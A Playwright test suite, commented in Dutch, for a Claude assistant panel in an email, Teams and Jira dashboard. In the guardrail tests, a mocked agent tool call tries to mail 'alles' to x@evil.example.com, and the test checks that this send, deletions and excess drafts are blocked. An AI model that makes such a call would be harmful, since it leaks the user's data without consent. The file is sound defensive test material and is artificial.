// B8: Claude-paneel in de detailkolom. De contextkaart volgt de selectie zonder het paneel te sluiten; taakmodus en
// vangrails ongewijzigd; Teams zonder recht (Missing scope) geeft een kopieer-en-plakregel; personen_zoeken uit het
// eigen adresboek; chattekst en Jira-commentaar via finishChat (geen dashes, "that being said", geen KR/Thomas).
const { test: base, expect } = require("@playwright/test");
const { buildMock, data, referenceNow } = require("./fixtures");
const { openPage, mockLog, mcpCalls, goTo, actionBar, openItem, openClaude, itemWith, nav, detail, feedbackBar } = require("./helpers");

const test = base.extend({
  open: async ({ page }, use) => {
    let problems = null;
    await use(async (mock, opts) => (problems = await openPage(page, mock, opts)));
    if (!problems || page.isClosed()) return;
    const log = await page.evaluate(() => window.__MOCK_LOG__).catch(() => null);
    if (log) expect(log.violations, "contractschendingen").toEqual([]);
    expect(problems.pageErrors, "uncaught exceptions").toEqual([]);
    expect(problems.consoleErrors, "console errors").toEqual([]);
  },
});

const LOTTE_CHAT = data.teams.chats[1].id; // 1-op-1 met Lotte Visser
const panel = (page) => page.locator("#chat");
const chatBox = (page) => page.getByRole("textbox", { name: "Bericht aan Claude" });
const ctxCard = (page) => page.getByRole("group", { name: "Context voor je vraag" });
const overlaps = (a, b) => a.x < b.x + b.width - 0.5 && b.x < a.x + a.width - 0.5 && a.y < b.y + b.height - 0.5 && b.y < a.y + a.height - 0.5;
const toolResults = async (page, name) => (await mockLog(page)).sampleTools.filter((t) => t.name === name);
const directCalls = async (page, tool) => (await mcpCalls(page, tool)).filter((c) => c.via === "callTool");
const lastInput = async (page) => JSON.stringify((await mockLog(page)).sample.at(-1).input);
const voer = (tool, input, samenvatting, server = "Microsoft 365") => ({ tool: "^voer_uit$", input: { server, tool, input, ...(samenvatting ? { samenvatting } : {}) } });
const lees = (tool, input = {}, server = "Microsoft 365") => ({ tool: "^lees$", input: { server, tool, input } });
const SHOTS = process.env.B8_SHOTS || "";

async function ask(page, q) {
  await expect(panel(page).getByRole("button", { name: "Verstuur" })).toBeVisible({ timeout: 8000 });
  await chatBox(page).fill(q);
  await chatBox(page).press("Enter");
}
async function askBar(page, q) {
  await expect(page.getByText("Architectuuroverleg Object Store").first()).toBeVisible();
  const box = await openClaude(page);
  await box.fill(q);
  await box.press("Enter");
}

// =========================================================================================
test.describe("Contextkaart volgt de selectie", () => {
  test("andere rij kiezen houdt het paneel open, het gesprek blijft en de volgende vraag gaat over het nieuwe item", async ({ page, open }) => {
    await open(buildMock({ sample: { rules: [
      { match: "Vraag van Thomas over deze mail: Wat vraagt hij\\?", text: "Hij vraagt om akkoord." },
      { match: "Vat samen", text: "Samenvatting van de eerste mail." },
    ] } }));
    await goTo(page, "Inbox");
    await openItem(page, "Budget CI-runners Q4");
    await actionBar(page).getByRole("button", { name: "Vraag Claude" }).click();
    await expect(ctxCard(page)).toContainText("Over: Budget CI-runners Q4");
    await ask(page, "Vat samen");
    await expect(page.getByText("Samenvatting van de eerste mail.").first()).toBeVisible({ timeout: 8000 });
    await expect(ctxCard(page)).toContainText("Over: Budget CI-runners Q4"); // kaart blijft staan
    if (SHOTS) await page.screenshot({ path: SHOTS + "/b8-desktop-contextkaart.png" });

    // Andere rij: paneel blijft open, kaart wisselt, gesprek blijft staan.
    await openItem(page, "Vraag over OIDC-scope voor partnerportaal", false);
    await expect(panel(page)).toBeVisible();
    await expect(page.locator("#detailView")).toBeHidden();
    await expect(ctxCard(page)).toContainText("Over: Vraag over OIDC-scope voor partnerportaal");
    await expect(page.getByText("Samenvatting van de eerste mail.").first()).toBeVisible();
    await expect(itemWith(page, "Vraag over OIDC-scope voor partnerportaal")).toHaveClass(/is-sel/);
    if (SHOTS) await page.screenshot({ path: SHOTS + "/b8-na-wisselen.png" });

    await ask(page, "Wat vraagt hij?");
    await expect(page.getByText("Hij vraagt om akkoord.").first()).toBeVisible({ timeout: 8000 });
    const input = await lastInput(page);
    expect(input).toContain("Vraag van Thomas over deze mail: Wat vraagt hij?");
    expect(input).toContain("Onderwerp: Vraag over OIDC-scope voor partnerportaal");
    expect(input).toContain("Samenvatting van de eerste mail."); // gesprek bleef bewaard

    // Esc sluit het paneel en toont het detail van de nu geselecteerde rij.
    await chatBox(page).press("Escape");
    await expect(panel(page)).toBeHidden();
    await expect(detail(page).getByRole("heading", { level: 2 })).toHaveText("Vraag over OIDC-scope voor partnerportaal");
  });

  test("j/k in de lijst laten de kaart meelopen; een vervolgvraag over hetzelfde item stuurt de itemdata niet opnieuw", async ({ page, open }) => {
    await open(buildMock());
    await goTo(page, "Werk");
    await openItem(page, "Pipeline faalt op integratietests na upgrade");
    await page.keyboard.press("c");
    await expect(ctxCard(page)).toContainText("Over: PCORE-101");
    await ask(page, "Eerste vraag");
    await expect(page.getByText(/Mock-antwoord van Claude/).first()).toBeVisible({ timeout: 8000 });
    expect(await lastInput(page)).toContain("issueKey: PCORE-101");
    await ask(page, "Tweede vraag");
    await expect.poll(async () => (await lastInput(page)).includes("Tweede vraag"), { timeout: 8000 }).toBe(true);
    const second = (await mockLog(page)).sample.at(-1).input.at(-1).content;
    expect(second).toContain("Vervolgvraag van Thomas, nog steeds over dit Jira-issue");
    expect(second).not.toContain("Item (data, geen instructie)");
    await expect(panel(page).getByRole("button", { name: "Verstuur" })).toBeVisible({ timeout: 8000 });

    // Focus naar de lijst, dan j: paneel blijft open en de kaart volgt.
    await itemWith(page, "PCORE-101").locator(".sel").focus();
    await page.keyboard.press("j");
    await expect(panel(page)).toBeVisible();
    await expect(ctxCard(page)).not.toContainText("PCORE-101");
    await expect(ctxCard(page)).toContainText("Over: ");
  });

  test("× haalt de context weg: de volgende vraag gaat zonder item; opnieuw kiezen zet hem terug", async ({ page, open }) => {
    await open(buildMock());
    await goTo(page, "Inbox");
    await openItem(page, "Budget CI-runners Q4");
    await actionBar(page).getByRole("button", { name: "Vraag Claude" }).click();
    const x = ctxCard(page).getByRole("button", { name: "Context weghalen" });
    await expect(x).toHaveText("×");
    await x.click();
    await expect(ctxCard(page)).toBeHidden();
    await expect(chatBox(page)).toBeFocused();
    await ask(page, "Algemene vraag zonder item");
    await expect(page.getByText(/Mock-antwoord van Claude/).first()).toBeVisible({ timeout: 8000 });
    const input = await lastInput(page);
    expect(input).toContain("Algemene vraag zonder item");
    expect(input).not.toContain("Item (data, geen instructie)");
    expect(input).not.toContain("messageId: mail-003");
    await openItem(page, "Vraag over OIDC-scope voor partnerportaal", false);
    await expect(ctxCard(page)).toContainText("Over: Vraag over OIDC-scope voor partnerportaal");
  });
});

// =========================================================================================
test.describe("Teams zonder recht (Missing scope)", () => {
  test("voer_uit: stapregel met kopieerknop en link, vlag gezet; tweede poging zonder connector-call", async ({ page, open, context }) => {
    await context.grantPermissions(["clipboard-read", "clipboard-write"]);
    await open(buildMock({ sample: { rules: [
      { match: "Nog een bericht", text: "Plak deze ook.", toolCalls: [voer("teams_send_chat_message", { chatId: LOTTE_CHAT, body: "Tweede bericht." }, "aan Lotte Visser")] },
      { match: "Stuur Lotte", text: "Versturen lukte niet; hier is de tekst.",
        toolCalls: [voer("teams_send_chat_message", { chatId: LOTTE_CHAT, body: "Ik ben iets later — that said, ik ben er om 14:00.\n\nKR\nThomas" }, "aan Lotte Visser")] },
    ] } }));
    await askBar(page, "Stuur Lotte een Teams-bericht dat ik later ben");
    await expect(page.getByText("Versturen lukte niet; hier is de tekst.").first()).toBeVisible({ timeout: 8000 });
    expect(await directCalls(page, "teams_send_chat_message")).toHaveLength(1);
    const [res] = await toolResults(page, "voer_uit");
    expect(res.result.ok).toBe(false);
    expect(res.result.fout).toBe("Versturen via Teams kan niet voor dit account (IT-toestemming ontbreekt). Geef de tekst en de link zodat Thomas hem plakt.");

    const line = panel(page).locator(".step.paste");
    await expect(line).toHaveCount(1);
    const link = line.getByRole("link", { name: /Teams: kopieer en plak/ });
    await expect(link).toContainText("Teams: kopieer en plak ↗");
    await expect(link).toHaveAttribute("target", "_blank");
    const href = await link.getAttribute("href");
    expect(href).toMatch(/^https:\/\/teams\.microsoft\.com\/l\/chat\/0\/0\?users=lotte\.visser@example\.com/);
    await line.getByRole("button", { name: "Kopieer tekst" }).click();
    await expect(line.getByRole("button", { name: "Gekopieerd" })).toBeVisible();
    const clip = await page.evaluate(() => navigator.clipboard.readText());
    expect(clip).toBe("Ik ben iets later, that being said, ik ben er om 14:00.");
    await expect(panel(page).locator("details.step.fail")).toHaveCount(0);

    // Vlag in de voorkeuren
    await expect.poll(async () => {
      const docs = await page.evaluate(() => window.__mockDb.dump("prefs/"));
      return Object.values(docs)[0]?.teamsSendBlocked?.since || "";
    }, { timeout: 8000 }).toMatch(/^\d{4}-\d{2}-\d{2}T/);

    // Tweede poging: direct de plakregel, geen connector-call.
    await ask(page, "Nog een bericht aan Lotte");
    await expect(page.getByText("Plak deze ook.").first()).toBeVisible({ timeout: 8000 });
    expect(await directCalls(page, "teams_send_chat_message")).toHaveLength(1);
    const res2 = (await toolResults(page, "voer_uit")).at(-1);
    expect(res2.result.fout).toMatch(/^Versturen via Teams kan niet voor dit account/);
    await expect(panel(page).locator(".step.paste")).toHaveCount(2);
  });

  test("met de vlag al gezet (minder dan 7 dagen) roept voer_uit de connector niet aan", async ({ page, open }) => {
    await open(buildMock({ teamsSendBlocked: false, db: { docs: { ...JSON.parse(JSON.stringify(require("./fixtures/acties.json"))),
      "prefs/thomas": { teamsSendBlocked: { since: new Date(referenceNow() - 86400000).toISOString() } } } },
      sample: { rules: [{ match: "kanaal", text: "Plak hem zelf.", toolCalls: [voer("teams_reply_channel_message", { teamId: "team-x", channelId: "19:kanaal-x@thread.tacv2", messageId: "m-1", body: "Klopt." })] }] } }));
    await askBar(page, "Antwoord in het kanaal dat het klopt");
    await expect(page.getByText("Plak hem zelf.").first()).toBeVisible({ timeout: 8000 });
    expect(await directCalls(page, "teams_reply_channel_message")).toEqual([]);
    const link = panel(page).locator(".step.paste").getByRole("link");
    await expect(link).toHaveAttribute("href", /^https:\/\/teams\.microsoft\.com\/l\/message\//);
  });
});

// =========================================================================================
test.describe("Adresboek en schrijfstijl", () => {
  test("personen_zoeken (server pagina) geeft naam en e-mail uit het adresboek, zonder connector", async ({ page, open }) => {
    await open(buildMock({ sample: { rules: [{ match: "Wie is Lotte", text: "Lotte Visser.", toolCalls: [lees("personen_zoeken", { q: "Lotte" }, "pagina")] }] } }));
    await goTo(page, "Inbox"); // adresboek vult zich uit mail en Teams
    await expect(itemWith(page, "Budget CI-runners Q4")).toBeVisible();
    await askBar(page, "Wie is Lotte?");
    await expect(page.getByText("Lotte Visser.").first()).toBeVisible({ timeout: 8000 });
    const [res] = await toolResults(page, "lees");
    expect(res.result).toContainEqual({ name: "Lotte Visser", email: "lotte.visser@example.com" });
    expect(await mcpCalls(page, "search_people")).toEqual([]);
    await expect(panel(page).locator("details.step.ok").filter({ hasText: "Adresboek doorzocht" })).toBeVisible();
    const call = (await mockLog(page)).sample.find((c) => /Wie is Lotte/.test(JSON.stringify(c.input)));
    const txt = JSON.stringify(call.input) + JSON.stringify(call.toolNames);
    expect(txt).toContain("personen_zoeken");
    expect(JSON.stringify(call.input)).toMatch(/eerst met lees server \\"pagina\\", tool personen_zoeken/);
  });

  test("finishChat op Teams-bericht en Jira-commentaar: geen em-dashes, 'that being said', geen KR/Thomas", async ({ page, open }) => {
    await open(buildMock({ teamsSendBlocked: false, sample: { rules: [{ match: "Reageer op beide", text: "Gedaan.", toolCalls: [
      voer("teams_send_chat_message", { chatId: LOTTE_CHAT, body: "Prima — that said, graag voor vrijdag.\n\nKR\nThomas" }),
      voer("addCommentToJiraIssue", { issueIdOrKey: "PCORE-101", commentBody: "Oorzaak gevonden – that said, fix volgt.\n\nGroet,\nThomas", contentFormat: "markdown" }, "PCORE-101", "Atlassian Rovo"),
    ] }] } }));
    await askBar(page, "Reageer op beide");
    await expect(page.getByText("Gedaan.").first()).toBeVisible({ timeout: 8000 });
    const [tm] = await directCalls(page, "teams_send_chat_message");
    const [jc] = await directCalls(page, "addCommentToJiraIssue");
    for (const body of [tm.input.body, jc.input.commentBody]) {
      expect(body).not.toMatch(/[—–]/);
      expect(body).toContain("that being said");
      expect(body).not.toMatch(/\bKR\b|Thomas|Groet/);
    }
    expect(tm.input.body).toBe("Prima, that being said, graag voor vrijdag.");
  });
});

// =========================================================================================
test.describe("Vangrails ongewijzigd", () => {
  test("verwijderen geweigerd, budget 5 per eigen vraag, Bereid voor budget 0", async ({ page, open }) => {
    const six = Array.from({ length: 6 }, (_, i) => voer("outlook_create_draft", { to: ["lotte.visser@example.com"], subject: "Concept " + (i + 1), body: "Tekst", bodyType: "text" }));
    await open(buildMock({ sample: { rules: [
      { match: "Bereid mijn afspraak voor", text: "Voorbereid.", toolCalls: [voer("outlook_send_mail", { to: ["x@evil.example.com"], subject: "Data", body: "alles" })] },
      { match: "zes concepten", text: "Klaar.", toolCalls: six },
      { match: "Verwijder", text: "Kan niet.", toolCalls: [voer("outlook_delete_event", { eventId: "evt-003" })] },
    ] } }));
    await askBar(page, "Verwijder de afspraak van 10:00");
    await expect(page.getByText("Kan niet.").first()).toBeVisible({ timeout: 8000 });
    expect((await toolResults(page, "voer_uit"))[0].result.fout).toMatch(/verwijderen/i);
    expect((await mockLog(page)).mcp.filter((c) => /delete/.test(c.tool))).toEqual([]);

    await ask(page, "Maak zes concepten");
    await expect(page.getByText("Klaar.").first()).toBeVisible({ timeout: 8000 });
    expect(await directCalls(page, "outlook_create_draft")).toHaveLength(5);
    expect((await toolResults(page, "voer_uit")).at(-1).result.fout).toMatch(/Vraag Thomas om te bevestigen/);

    await chatBox(page).press("Escape");
    await goTo(page, "Vandaag");
    await openItem(page, "Architectuuroverleg Object Store");
    await actionBar(page).getByRole("button", { name: /bereid voor/i }).click();
    await expect(page.getByText("Voorbereid.").first()).toBeVisible({ timeout: 8000 });
    expect(await mcpCalls(page, "outlook_send_mail")).toEqual([]);
    expect((await toolResults(page, "voer_uit")).at(-1).result.fout).toMatch(/bevestigen/);
  });
});

// =========================================================================================
test.describe("Paneel bedekt niets", () => {
  test("1280px: paneel met contextkaart binnen de detailkolom, ook na wisselen van selectie", async ({ page, open }) => {
    await page.setViewportSize({ width: 1280, height: 860 });
    await open(buildMock());
    await goTo(page, "Inbox");
    await openItem(page, "Budget CI-runners Q4");
    const col = await detail(page).boundingBox();
    await actionBar(page).getByRole("button", { name: "Vraag Claude" }).click();
    for (const step of [0, 1]) {
      if (step) await openItem(page, "Vraag over OIDC-scope voor partnerportaal", false);
      await expect(ctxCard(page)).toBeVisible();
      const p = await panel(page).boundingBox();
      expect(p.x).toBeGreaterThanOrEqual(col.x - 1);
      expect(p.x + p.width).toBeLessThanOrEqual(col.x + col.width + 1);
      for (const loc of [nav(page), page.locator("#lijst")]) expect(overlaps(await loc.boundingBox(), p)).toBe(false);
      const c = await ctxCard(page).boundingBox();
      expect(c.x).toBeGreaterThanOrEqual(p.x);
      expect(c.y).toBeGreaterThanOrEqual(p.y);
      expect(c.x + c.width).toBeLessThanOrEqual(p.x + p.width + 0.5);
    }
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(1280);
  });

  test("375px: paneel is het detailscherm, bedekt de tabbalk niet; kaart en invoer passen", async ({ page, open }) => {
    await page.setViewportSize({ width: 375, height: 740 });
    await open(buildMock());
    await goTo(page, "Inbox");
    await itemWith(page, "Budget CI-runners Q4").click({ position: { x: 60, y: 14 } });
    await actionBar(page).getByRole("button", { name: "Vraag Claude" }).click();
    await expect(ctxCard(page)).toContainText("Over: Budget CI-runners Q4");
    const p = await panel(page).boundingBox(), t = await nav(page).boundingBox(), c = await ctxCard(page).boundingBox();
    expect(overlaps(p, t)).toBe(false);
    expect(p.width).toBeLessThanOrEqual(375);
    expect(c.x).toBeGreaterThanOrEqual(0);
    expect(c.x + c.width).toBeLessThanOrEqual(375);
    await expect(chatBox(page)).toBeInViewport();
    if (await feedbackBar(page).isVisible()) expect(overlaps(await feedbackBar(page).boundingBox(), p)).toBe(false);
    expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBeLessThanOrEqual(375);
    if (SHOTS) await page.screenshot({ path: SHOTS + "/b8-mobiel-paneel.png" });
  });
});
